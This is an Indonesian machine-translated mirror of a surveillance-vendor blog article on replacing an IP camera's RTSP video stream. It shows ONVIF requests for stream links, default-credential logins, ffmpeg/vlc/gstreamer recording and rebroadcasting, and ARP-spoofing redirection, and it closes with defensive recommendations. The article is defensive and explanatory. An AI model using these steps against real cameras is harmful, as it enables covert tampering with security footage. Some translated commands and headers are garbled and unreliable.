<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßù üôç üçò Meretas kamera CCTV dalam praktiknya üìß üßëüèø‚Äçü§ù‚Äçüßëüèª üìö</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Penggemar film Ocean's Eleven Friends pasti mengenali bingkai yang kami pilih untuk menggambarkan artikel ini. Momen ketika orang-orang tangguh dengan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Meretas kamera CCTV dalam praktiknya</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/devline/blog/405083/">  Penggemar film Ocean's Eleven Friends pasti mengenali bingkai yang kami pilih untuk menggambarkan artikel ini.  Momen ketika orang-orang tangguh dengan terampil mengganti sinyal analog dari kamera CCTV kasino masuk ke pikiran banyak orang.  Beberapa bahkan mencoba melakukan ini di kehidupan nyata. <br><br><img src="https://habrastorage.org/web/121/cd6/5f9/121cd65f9c634829977ee5eb5de23af4.jpg" alt="gambar"><br><br>  Teknologi telah berubah, sekarang kamera IP lebih disukai daripada analog, metode untuk memutusnya akan dibahas secara rinci nanti. <br><br><h3>  Jika Anda tidak paranoid, ini tidak berarti Anda tidak diawasi </h3><br>  Sebagian besar peretas melakukan ini untuk bersenang-senang atau untuk mendapatkan ketenaran di Internet.  Mereka menggunakan "lubang" yang terkenal dalam sistem pendukung kamera dan memposting, menurut pendapat mereka, video lucu tentang sumber daya Internet yang populer.  YouTube penuh dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">video</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">serupa</a> . <br><br>  Kami akan mempertimbangkan konsekuensi yang lebih serius dari kerentanan, yaitu ketika cracker tidak mengkhianati dirinya sendiri dan penetrasi ke dalam sistem.  Serangan seperti itu biasanya direncanakan dengan hati-hati sebelumnya, seminggu, atau bahkan sebulan sebelum peretasan. <br><br>  Seperti dalam contoh kami tentang Ocean Eleven, kita akan berbicara tentang mengganti aliran dalam sistem pengawasan video, bukan hanya analog, tetapi sinyal digital, yaitu aliran RTSP. <br><a name="habracut"></a><br>  Karena semua informasi dalam artikel ini bersifat informasi dan terutama ditujukan untuk menghilangkan kesalahan keamanan ketika membangun sistem pengawasan video, kami tidak merekomendasikan menggunakan kerentanan, yang akan dibahas nanti.  Itulah sebabnya peretasan jaringan pengawasan video itu sendiri akan dianggap hanya secara dangkal dan metode yang dijelaskan melibatkan akses terbuka ke jaringan perusahaan atau orang pribadi.  Ingat bahwa akses tidak sah ke data dapat dituntut. <br><br>  Pengalaman perusahaan kami menunjukkan bahwa topik tersebut sangat relevan, karena pada tahap commissioning sistem pengawasan video, banyak orang menghubungkan kamera ke sistem mereka menggunakan tautan RTSP.  Entah untuk menghemat waktu, entah karena ketidaktahuan, atau karena merasa perlu, banyak yang bahkan tidak berpikir untuk mengubah kata sandi atau melihat pengaturan keamanan yang didukung kamera mereka. <br><br>  Omong-omong, RTSP (Real Time Streaming Protocol) adalah protokol yang memungkinkan Anda untuk mengontrol video streaming secara real time.  Yang perlu kita ketahui tentang hal itu adalah bahwa dengan bantuan tautan RTSP kita akan mengambil aliran video dari kamera. <br><br>  Akhirnya, kita harus <b>berlatih</b> , yaitu sesuai dengan rencana yang akan kita tindak lanjuti: <br><br>  1. Mendapatkan tautan RTSP untuk kamera yang alirannya ingin kami ganti. <br>  2. Mempersiapkan file video untuk siaran selanjutnya. <br>  3. Siarkan file yang direkam. <br>  4. Perlindungan terhadap swapping aliran sekunder. <br><br><h3>  Memperoleh RTSP URI Stream </h3><br>  Untuk mengganti sinyal dari kamera, Anda harus terlebih dahulu menemukan aliran video yang kami butuhkan.  Ini akan membutuhkan tautan ke sana melalui protokol RTSP.  Kamera biasanya mentransmisikan banyak gambar (resolusi tinggi dan rendah).  Yang pertama digunakan untuk merekam, dan yang kedua - untuk disiarkan di layar pengawasan video.  Resolusi minimum (paling sering 320 x 240 piksel) mengurangi beban pada peralatan.  Untuk setiap aliran RTSP, tautannya sering dibedakan dengan satu digit pada kunci. <br><br>  Kamera yang berbeda mungkin memiliki tautan RTSP yang berbeda, tetapi pandangan umumnya kira-kira sebagai berikut: <br>  <b>rtsp: // [login: password @] ip-address: RTSP-port [/ key]</b> . <br><br>  Penguraiannya sebagai berikut: <br><br><ul><li>  login dan kata sandi - yang digunakan untuk mengakses kamera (mungkin tidak); </li><li>  jika tautan berisi nama pengguna dan kata sandi, maka simbol @ ditunjukkan setelah mereka untuk memisahkan otorisasi dan alamat IP; </li><li>  Port RTSP melalui mana perintah kontrol video streaming dikirim secara default adalah 554; </li><li>  kuncinya adalah bagian unik dari tautan RTSP, yang dapat bervariasi tergantung pada produsen dan model kamera, misalnya: <br>  /? user = admin &amp; kata sandi = admin &amp; saluran = channel_number &amp; stream = stream_number.sdp <br>  /play1.sdp - alih-alih "1" nomor streaming ditunjukkan; <br>  / live / ch00_0 00 - nomor saluran, 0 - nomor aliran; <br>  / channel1 - alih-alih ‚Äú1‚Äù nomor aliran ditunjukkan. </li></ul><br>  <b>Bagaimana cara mengetahui tautan RTSP tanpa memiliki akses ke kamera?</b>  Beberapa cara sederhana: <br><br>  1. Temukan tautan di situs web produsen kamera. <br>  2. Cari di Internet untuk situs-situs yang menyediakan tautan untuk berbagai model kamera, contoh situs semacam itu di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> dan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br>  3. Unduh manual pengguna di situs web produsen dan temukan informasi yang diperlukan di sana. <br><br>  Untuk kasus di mana tidak ada metode sederhana yang membantu, ada yang sedikit lebih rumit.  Di sini setidaknya dibutuhkan akses ke jaringan tempat kamera berada.  Karena sebagian besar kamera modern mendukung ONVIF, kita dapat mengetahui tautan RTSP menggunakan protokol ini. <br>  Untuk melakukan ini, kirim beberapa permintaan tanpa otorisasi atau dengan otorisasi pada kamera yang diusulkan secara default, misalnya, "admin: admin" atau "admin: 12345".  Ngomong-ngomong, dalam praktiknya ada kamera yang memiliki filter alamat IP yang valid dan login dan kata sandi yang tidak standar, tetapi karena kesalahan dalam firmware ketika mengakses melalui protokol ONVIF, otorisasi atau filter tidak diperiksa. <br><br>  <b>Bagaimana cara mendapatkan tautan yang diinginkan untuk kedua aliran dari kamera melalui protokol ONVIF?</b> <br><br><div class="spoiler">  <b class="spoiler_title">1. Menggunakan perintah GetProfiles, kami mencari tahu nama profil yang uri kami butuhkan</b> <div class="spoiler_text"><pre> POST / onvif / media_service HTTP / 1.1
 Tuan rumah: 192.168.1.77
 User-Agent: gSOAP / 2.8
 Tipe-Konten: aplikasi / sabun + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetProfiles"
 Panjang Konten: 2120
 Koneksi: tetap hidup
 SOAPAction: "http://www.onvif.org/ver10/media/wsdl/GetProfiles"<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: Envelope xmlns: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Lewati deskripsi seluruh namespace.
                    .
                    xmlns: trt = "http://www.onvif.org/ver10/media/wsdl"&gt;
     &lt;SOAP-ENV: Header&gt; &lt;/ SOAP-ENV: Header&gt;
     &lt;SOAP-ENV: Body&gt;
         &lt;trt: GetProfiles /&gt;
     &lt;/ SOAP-ENV: Tubuh&gt;
 &lt;/ SOAP-ENV: Envelope&gt;
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">2. Dalam jawaban panjang yang diterima, kami menemukan garis dengan nama profil pertama dan kedua</b> <div class="spoiler_text"><pre> HTTP / 1.1 200 OK
 Server: gSOAP / 2.8
 Tipe-Konten: aplikasi / sabun + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetProfiles"
 Panjang Konten: 17405
 Koneksi: tutup<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: Envelope xmlns: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Lewati deskripsi seluruh namespace.
                    .
                    xmlns: tns1 = "http://www.onvif.org/ver10/topics"&gt;
     &lt;SOAP-ENV: Header&gt; &lt;/ SOAP-ENV: Header&gt;
     &lt;SOAP-ENV: Body&gt;
         &lt;trt: GetProfilesResponse&gt;
             &lt;trt: Profil fixed = "true" token = "profile_cam1_stream1"&gt;
                 &lt;tt: Name&gt; profile_cam1_stream1 &lt;/ tt: Name&gt;
                 &lt;tt: VideoSourceConfiguration token = "videosource_config_cam1"&gt;
                     &lt;tt: Name&gt; videosource_config_cam1 &lt;/ tt: Name&gt;
                     .
                     Lewati deskripsi profil.
                     .
             &lt;/ trt: Profiles&gt;
             &lt;trt: Profil fixed = "true" token = "profile_cam1_stream2"&gt;
                 &lt;tt: Name&gt; profile_cam1_stream2 &lt;/ tt: Name&gt;
                 .
                 Kami melewatkan deskripsi profil kedua.
                 .
             &lt;/ trt: Profiles&gt;
             .
             Kami tidak mempertimbangkan profil ketiga.
             .
         &lt;/ trt: GetProfilesResponse&gt;
     &lt;/ SOAP-ENV: Tubuh&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 - profile_cam1_stream1 adalah nama profil pertama di kamera.
 - profile_cam1_stream2 adalah nama profil kedua pada kamera.
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">3. Sekarang Anda perlu meminta rtsp uri untuk profil ini menggunakan perintah GetStreamUri, menentukan profil yang diinginkan di bidang ProfileToken</b> <div class="spoiler_text"><pre> Contoh untuk utas pertama:<font></font>
<font></font>
 POST / onvif / media_service HTTP / 1.1
 Tuan rumah: 192.168.1.77
 User-Agent: gSOAP / 2.8
 Tipe-Konten: aplikasi / sabun + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"
 Panjang Konten: 2479
 Koneksi: tetap hidup
 SOAPAction: "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: Envelope xmlns: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Lewati deskripsi seluruh namespace.
                    .
                    xmlns: trt = "http://www.onvif.org/ver10/media/wsdl"&gt;
     &lt;SOAP-ENV: Header&gt; &lt;/ SOAP-ENV: Header&gt;
     &lt;SOAP-ENV: Body&gt;
         &lt;trt: GetStreamUri&gt;
             &lt;trt: StreamSetup xsi: type = "tt: StreamSetup"&gt;
                 &lt;tt: Stream xsi: type = "tt: StreamType"&gt; RTP-Unicast &lt;/ tt: Stream&gt;
                 &lt;tt: Transport xsi: type = "tt: Transport"&gt;
                     &lt;tt: Protokol xsi: type = "tt: TransportProtocol"&gt; UDP &lt;/ tt: Protokol&gt;
                 &lt;/ tt: Transport&gt;
             &lt;/ trt: StreamSetup&gt;
             &lt;trt: ProfileToken xsi: type = "tt: ReferenceToken"&gt; profile_cam1_stream1 &lt;/ trt: ProfileToken&gt;
         &lt;/ trt: GetStreamUri&gt;
     &lt;/ SOAP-ENV: Tubuh&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 Sebagai tanggapan, kami mendapatkan tautan yang kami butuhkan:<font></font>
<font></font>
 HTTP / 1.1 200 OK
 Server: gSOAP / 2.8
 Tipe-Konten: aplikasi / sabun + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"
 Panjang Konten: 3701
 Koneksi: tutup<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: Envelope xmlns: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Lewati deskripsi seluruh namespace.
                    .
                    xmlns: tns1 = "http://www.onvif.org/ver10/topics"&gt;
     &lt;SOAP-ENV: Header&gt; &lt;/ SOAP-ENV: Header&gt;
     &lt;SOAP-ENV: Body&gt;
         &lt;trt: GetStreamUriResponse&gt;
             &lt;trt: MediaUri&gt;
                 &lt;tt: Uri&gt; rtsp: //192.168.1.77: 554 / snl / live / 1/1 &lt;/ tt: Uri&gt;
                 &lt;tt: InvalidAfterConnect&gt; false &lt;/ tt: InvalidAfterConnect&gt;
                 &lt;tt: InvalidAfterReboot&gt; false &lt;/ tt: InvalidAfterReboot&gt;
                 &lt;tt: Timeout&gt; PT0S &lt;/ tt: Timeout&gt;
             &lt;/ trt: MediaUri&gt;
         &lt;/ trt: GetStreamUriResponse&gt;
     &lt;/ SOAP-ENV: Tubuh&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 Kami melakukan hal yang sama untuk streaming kedua dan mendapatkan tautan:
 &lt;tt: Uri&gt; rtsp: //192.168.1.77: 554 / snl / live / 1/2 &lt;/ tt: Uri&gt;
</pre><br></div></div><br><h3>  Tulis aliran RTSP ke file </h3><br>  Ketika kami mendapatkan tautan rtsp yang diperlukan, kami perlu merekam siaran video yang berlangsung beberapa jam.  Jangan lupa bahwa dual-threading digunakan dalam sistem modern, jadi Anda perlu merekam kedua aliran pada saat yang sama. <br><br>  Anda dapat merekam streaming video menggunakan protokol RTSP menggunakan berbagai perangkat lunak.  Pertimbangkan yang paling populer: <b>ffmpeg, gstreamer dan vlc</b> . <br><br><div class="spoiler">  <b class="spoiler_title">1. Streaming rekaman melalui ffmpeg</b> <div class="spoiler_text"><pre> $ man ffmpeg
 Kami tertarik pada:
 - salin vcodec - salin video ke file;
 - salin acodec - menyalin audio ke file;
 - rtsp_transport tcp - pemilihan metode untuk mentransmisikan stream;
 - r 25 - mengatur frame rate per detik;
 - copy - cap waktu penyalinan;
 - start_at_zero - salin cap waktu mulai dari 00: 00: 00: 000<font></font>
<font></font>
 Kami mengganti tautan RTSP kami dan melalui salinan kami menentukan jalur dan nama file yang akan dituju
 % ffmpeg -i rtsp: //192.168.1.77: 554 / snl / live / 1/1-copyts -start_at_zero -rtsp_transport tcp -r 25 -plikasi pvcodec -acodec copy /home/line/example/1.avi
</pre><br><img src="https://habrastorage.org/web/6a1/d19/f7f/6a1d19f7fe8b4153823d0307adccf174.png" alt="gambar"><br><br>  Menulis ke file telah dimulai. <br></div></div><br><div class="spoiler">  <b class="spoiler_title">2. Merekam melalui vlc</b> <div class="spoiler_text"><pre> Anda dapat membiasakan diri dengan serangkaian perintah yang ditawarkan oleh media player vlc menggunakan perintah
 $ vlc ‚Äìj.<font></font>
<font></font>
 Kami tertarik pada:
 - sout = # file {path} - arahkan ke file yang ingin kita salin videonya;
 - rtsp-tcp - menerima rtsp oleh tcp;
 - rtsp-frame-buffer-size = 1000 - buffer sehingga video tidak hancur selama pemutaran;
 - h264-fps = 25 - add-on untuk 25 frame.<font></font>
<font></font>
 Ganti data kami dan jalankan
 $ cvlc rtsp: //192.168.1.77: 554 / snl / live / 1/1 --rtsp-tcp --rtsp-frame-buffer-size = 1000 --h264-fps = 25: sout = # file {dst = /home/line/example/1.avi}.<font></font>
<font></font>
 Jendela vlc akan terbuka dan perekaman akan dimulai, ketika Anda menutup jendela, perekaman akan berhenti.
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">3. Merekam melalui gstreamer</b> <div class="spoiler_text"><pre> Informasi tentang bekerja dengan gstreamer dapat ditemukan &lt;a href="https://gstreamer.freedesktop.org/documentation/plugins.html"&gt; di sini &lt;/a&gt;.
 - rtspsrc location = "rtsp: //192.168.1.91: 554 / cam / realmonitor? Saluran = 1 &amp; subtipe = 0 &amp; unicast = true &amp; proto = Onvif" - tentukan aliran RTSP sebagai sumber data.
 - rtph264depay - dalam video RTSP berjalan kecil-kecil (paket rtp), melalui rtph264depay kita akan menerima video dari paket-paket ini.
 - h264parse - sesuai namanya, uraikan aliran H.264.
 - avimux - kumpulkan streaming di avi, Anda juga dapat menggunakan mp4mux atau matroskamux (mkv).
 - filesink location = 1.avi - tentukan file tempat video akan disimpan.<font></font>
<font></font>
 gst-launch-1.0 -v rtspsrc location = "rtsp: //192.168.1.91: 554 / cam / realmonitor? channel = 1 &amp; subtipe = 0 &amp; unicast = true &amp; proto = Onvif"!  rtph264depay!  h264parse!  mp4mux!  lokasi filesink = 1.mp4
</pre><br><img src="https://habrastorage.org/web/032/b02/115/032b021155034149bc35e8068548d5eb.png" alt="gambar"><br></div></div><br><h3>  Siaran streaming RTSP dari file </h3><br>  Saatnya untuk mulai menyiarkan file rekaman dalam format RTSP.  Untuk melakukan ini, kami akan menggunakan semua program yang sama yang dibahas pada bagian di atas. <br><br>  1. Untuk menyiarkan aliran video dari kamera menggunakan ffmpeg, Anda harus menggunakan ffserver.  Uraiannya dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Untuk mengatur parameter terjemahan, Anda perlu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengisi file</a> ffserver.conf. <br><br><div class="spoiler">  <b class="spoiler_title">ffserver</b> <div class="spoiler_text"><pre> File Ffserver.conf
 RTSPPort - setel nomor port rtsp yang akan digunakan siarannya.
 &lt;Stream snl / live / 1/1&gt; - setelah Stream kami mengatur kunci yang diperlukan.
 Format rtp - format transmisi.
 File "/home/line/example/1.avi" - rtsp_transport tcp - tentukan path ke file yang ingin Anda transfer, dan kunci untuk mentransfer melalui tcp.
 NoAudio - jangan mentransmisikan suara.<font></font>
<font></font>
 File Ffserver.conf<font></font>
<font></font>
 RTSPPort 554<font></font>
<font></font>
 &lt;Streaming snl / live / 1/1&gt;
 Format rtp
 File "/home/line/example/1.avi" -rtsp_transport tcp
 NoAudio 
 &lt;/Stream&gt;
 Selanjutnya, jalankan% ffserver -f ffserver.conf.
</pre><br><img src="https://habrastorage.org/web/bff/0c4/0bb/bff0c40bb4b5431fb1b564ed19d442c7.png" alt="gambar"><br></div></div><br>  2. Sekarang kita akan menggunakan pemutar media-vlc.  Terlepas dari kenyataan bahwa ini adalah cara termudah, sayangnya, vlc hanya dapat menyiarkan aliran melalui UDP. <br><br><div class="spoiler">  <b class="spoiler_title">pemutar media vlc</b> <div class="spoiler_text"><pre> Perintah untuk memulai aliran rtsp:
 - sout = # rtp {sdp = rtsp: //192.168.1.232: 554 / snl / live / 1/1} - setel tautan tempat siaran akan berlangsung.
 - ulangi - jika perlu, atur video untuk diputar berulang kali.
 vlc /home/line/example/1.avi --sout = # rtp {sdp = rtsp: //192.168.1.232: 554 / snl / live / 1/1} ‚Äîulangi
</pre><br></div></div><br>  3. Akhirnya, menggunakan gst-server. <br><br><div class="spoiler">  <b class="spoiler_title">gst-server</b> <div class="spoiler_text"><pre> Pertama, Anda perlu menginstalnya.
 $ sudo apt-get install gstreamer1.0
 $ wget https://gstreamer.freedesktop.org/src/gst-rtsp-server/gst-rtsp-server-1.8.3.tar.xz
 /gst-rtsp-server-1.8.3$ sudo untuk menginstal gtk-doc-tools
 /gst-rtsp-server-1.8.3$ sudo apt-get install libgstreamer-plugins-base1.0-dev
 /gst-rtsp-server-1.8.3$ make
 Sekarang kita dapat mengubah file /gst-rtsp-server-1.8.3/examples/test-launch.c
 Di sini Anda dapat mengubah port RTSP default
 #define DEFAULT_RTSP_PORT "8554"
 dan kuncinya ada di tautan
 gst_rtsp_mount_points_add_factory (mounts, "/ test", factory).
 Setelah mengganti nilai-nilai kami, kami akan membuatnya.
 Sekarang jalankan file uji peluncuran dengan kunci.
 - rtspsrc location = "/ home / line / example / 1.avi" - path ke file yang akan kita mainkan.
 - H264 Encoder - menyandi dalam h.264.
 - rtph264pay name = pay0 pt = 96 - bagi aliran kami menjadi beberapa bagian.
 $ ~ / gst-rtsp-server-1.8.3 / contoh $ ./test-launch "(rtspsrc location =" / home / line / example / 1.avi "! x264enc! rtph264pay nama = pay0 pt = 96)"
</pre><br></div></div><br>  File yang direkam disiarkan dalam format RTSP, setelah itu kami memecahkan masalah kegagalan kamera.  Di bawah ini adalah beberapa opsi yang bervariasi tergantung pada objek yang ingin kita serang.  Bahkan, ada banyak cara lagi, hanya mempertimbangkan yang paling dasar.  Hal pertama yang kita butuhkan adalah masuk ke jaringan yang kita butuhkan. <br><br>  Jika objek besar secara teritori, maka seringkali ada kesempatan untuk mendekati beberapa kamera secara fisik dan bahkan mencoba menemukan peralatan switching yang terhubung dengan kamera. <br><br>  Jika objeknya kecil, maka Anda dapat mencoba memasuki jaringan melalui wi-fi dan memindainya menggunakan nmap, misalnya. <br><br>  Juga, jika ada akses fisik ke kamera, Anda dapat meretasnya dalam beberapa tahap menggunakan komputer pelat tunggal: <br><br>  1) mengaktifkan rekaman wireshark; <br>  2) secara singkat lepaskan kabel dari kamera dan hubungkan ke satu papan; <br>  3) kembalikan kabel ke tempatnya; <br>  4) mempelajari log yang diterima. <br><br>  Atau jika Anda memiliki akses ke jaringan, Anda dapat menggunakan metode substitusi klasik: <br><br>  - menggunakan dudukan arpspoof antara kamera dan server; <br>  - gunakan ip_forward untuk meneruskan permintaan dari server pengawasan ke kamera IP, dan sebaliknya; <br>  - menggunakan iptables mengalihkan semua permintaan melalui port RTSP ke server pengawasan bukan dari kamera, tetapi dari mesin kami. <br><br><h3>  Meretas kamera keamanan </h3><br>  Untuk melindungi diri Anda dari spoofing utas menurut prosedur yang dijelaskan di atas, beberapa metode dapat digunakan: <br><br>  <b>1. Integrasi Kamera</b> <br>  Perlindungan terbesar diberikan oleh integrasi kamera dalam produk perangkat lunak.  Periksa apakah kamera Anda terintegrasi dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sistem pengawasan Line di</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br>  Jika kamera atau pabrikan Anda tidak terdaftar, Anda dapat menghubungi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dukungan teknis</a> dengan permintaan untuk mengintegrasikan model kamera IP Anda. <br><br>  <b>2. Pembaruan firmware</b> <br>  Penting untuk terus memperbarui firmware kamera, karena dengan bantuan pembaruan, para pengembang memperbaiki berbagai kerentanan dan dengan demikian meningkatkan stabilitas kamera. <br><br>  <b>3. Perubahan login dan kata sandi standar</b> <br>  Hal pertama yang dilakukan penyerang adalah mencoba menggunakan nama pengguna dan kata sandi kamera standar.  Mereka ditunjukkan dalam instruksi untuk digunakan, sehingga menemukan mereka tidak sulit.  Karena itu, selalu gunakan nama pengguna dan kata sandi yang unik. <br><br>  <b>4. Mengaktifkan otorisasi wajib</b> <br>  Fitur ini hadir di banyak kamera modern, tetapi, sayangnya, tidak semua pengguna mengetahuinya.  Jika Anda menonaktifkan opsi ini, kamera tidak akan meminta otorisasi ketika terhubung dengannya, yang akan membuatnya rentan terhadap peretasan.  Perlu dicatat bahwa ada kamera dengan otorisasi ganda untuk akses http dan untuk akses melalui protokol ONVIF.  Juga, di beberapa kamera ada pengaturan terpisah untuk permintaan otorisasi saat menghubungkan melalui tautan RTSP langsung. <br><br>  <b>5. filter alamat IP</b> <br>  Jika kamera mendukung fungsi yang disebut daftar putih, maka lebih baik untuk tidak mengabaikannya.  Dengan bantuannya, alamat IP dari mana Anda dapat terhubung ke kamera ditentukan.  Ini harus menjadi alamat server yang terhubung dengan kamera dan, jika perlu, alamat IP kedua dari workstation tempat konfigurasi dibuat.  Tapi ini bukan metode yang paling dapat diandalkan, karena penyerang dapat menggunakan alamat IP yang sama saat mengganti perangkat.  Oleh karena itu, yang terbaik adalah menggunakan opsi ini bersama dengan rekomendasi lainnya. <br><br>  <b>6. Perlindungan jaringan</b> <br>  Penting untuk mengkonfigurasi peralatan switching dengan benar.  Sebagian besar switch sekarang mendukung perlindungan spoofing arp - pastikan untuk menggunakan ini. <br><br>  <b>7. Berbagi jaringan</b> <br>  Anda harus memberi perhatian khusus pada item ini, karena ini memainkan peran besar dalam keamanan sistem Anda.  Pemisahan jaringan perusahaan dan jaringan pengawasan akan melindungi Anda dari penyusup atau bahkan dari karyawan Anda sendiri yang memiliki akses ke jaringan bersama dan ingin meretas Anda. <br><br>  <b>8. Menghidupkan menu OSD</b> <br>  Anda harus mengaktifkan menu OSD dengan waktu dan tanggal saat ini di kamera sehingga Anda selalu dapat memeriksa relevansi gambar.  Ini adalah cara yang baik untuk melindungi terhadap perubahan rekaman, karena OSD ditumpangkan pada semua video yang berasal dari kamera tertentu.  Bahkan ketika seorang penyerang menuliskan aliran RTSP, spoofing akan terlihat berkat data yang akan tetap ada di frame video. <br><br>  Sayangnya, banyak penyerang telah belajar untuk dengan cepat menemukan dan memanfaatkan kerentanan dalam sistem pengawasan video IP.  Untuk mengamankan jaringan, Anda perlu membiasakan diri dengan metode perlindungan yang dijelaskan dalam artikel ini.  Berikan waktu yang cukup untuk commissioning sistem, dan khususnya untuk mengkonfigurasi semua komponennya dengan benar.  Jadi, Anda dapat memberikan jaringan dengan keamanan maksimum dari peretasan. <br><br>  <b>Sebagai kesimpulan, kami sarankan Anda berbagi dalam komentar, bagaimana Anda akan mendekati perlindungan jaringan pengawasan video Anda dari peretasan?</b>  <b>Metode serangan apa yang Anda anggap paling berbahaya?</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id405083/">https://habr.com/ru/post/id405083/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id405073/index.html">Pusat Data untuk Piala Dunia</a></li>
<li><a href="../id405075/index.html">Mengirim dan menerima pesan SMS menggunakan gateway VoIP OpenVox</a></li>
<li><a href="../id405077/index.html">Pemantauan suhu anggaran: Arduino + Zabbix</a></li>
<li><a href="../id405079/index.html">California membayar negara-negara tetangga untuk mengambil kelebihan listrik dari pembangkit listrik tenaga surya</a></li>
<li><a href="../id405081/index.html">[KASUS] Bagaimana kami membuat salinan Worker and Collective Farm Girl untuk Museum Parlemen Eropa</a></li>
<li><a href="../id405085/index.html">Ulasan video pada kamera Clevermic UNO PTZ</a></li>
<li><a href="../id405087/index.html">Bagaimana menghubungkan pengawasan video menggunakan amplifikasi sinyal 2G / 3G / 4G</a></li>
<li><a href="../id405089/index.html">Bagaimana cara layanan Dog Walking?</a></li>
<li><a href="../id405091/index.html">NASA akan menabrak asteroid pada Oktober 2022 untuk menguji pertahanan planet</a></li>
<li><a href="../id405093/index.html">Mengapa partikel Higgs begitu penting</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
